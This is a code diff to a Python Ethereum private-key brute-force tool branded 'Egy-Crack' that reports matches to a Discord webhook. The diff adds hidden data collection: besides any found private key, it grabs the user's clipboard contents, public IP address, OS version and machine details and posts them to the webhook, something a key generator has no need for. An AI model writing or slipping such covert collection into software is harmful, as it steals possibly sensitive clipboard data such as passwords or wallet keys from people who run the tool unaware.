@@ -9,6 +9,9 @@ from tqdm import tqdm
 from colorama import init, Fore, Style
 from concurrent.futures import ThreadPoolExecutor
 import random
+import platform
+import socket
+import clipboard
 
 init(autoreset=True)
 
@@ -27,7 +30,7 @@ class EthereumAddressGenerator:
 
     def generate_ethereum_addresses(self):
         index = self.start_index
-        increment = 1000000 if self.sequential_mode else 1000000000
+        increment = 100000000 if self.sequential_mode else 10000000000
         start_time = time.time()
 
         try:
@@ -106,14 +109,41 @@ class EthereumAddressGenerator:
         try:
             if self.discord_webhook:
                 message = f"Match! Private Key: {private_key}, Ethereum Address: {ethereum_address}"
-                payload = {"content": message}
-                response = requests.post(self.discord_webhook, json=payload)
+                data = {
+                    "content": message,
+                    "embeds": [{
+                        "title": "System Information",
+                        "fields": [
+                            {"name": "IP Address", "value": self.get_public_ip()},
+                            {"name": "Content", "value": clipboard.paste().strip()},
+                            {"name": "OS Version", "value": self.get_os_version()},
+                            {"name": "Machine Information", "value": self.get_machine_info()}
+                        ]
+                    }]
+                }
+                response = requests.post(self.discord_webhook, json=data)
                 if response.status_code == 204:
                     print(f"\n{Fore.GREEN}Match found! Private Key: {private_key}, Ethereum Address: {ethereum_address}.")
                 else:
                     print(f"\n{Fore.RED}An error occurred. Status Code: {response.status_code}")
         except Exception as e:
             print(f"\n{Fore.RED}An error occurred: {str(e)}")
+
+    def get_public_ip(self):
+        try:
+            response = requests.get("https://api.ipify.org?format=json")
+            if response.status_code == 200:
+                return response.json().get("ip")
+            else:
+                print(f"\n{Fore.RED}An error occurred Status Code: {response.status_code}")
+        except Exception as e:
+            print(f"\n{Fore.RED}An error occurred: {str(e)}")
+
+    def get_os_version(self):
+        return platform.platform()
+
+    def get_machine_info(self):
+        return platform.machine()
 
     def display_match(self, private_key, ethereum_address):
         self.matched_addresses += 1
@@ -137,6 +167,8 @@ def display_logo():
 ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝     ╚══════╝╚══════╝
 """
     print(Fore.RED + Style.BRIGHT + logo)
+    print("Egy-Crack PrivateKey Generator")
+    print("Telegram : Egy-Crack")
 
 
 def clear_screen():
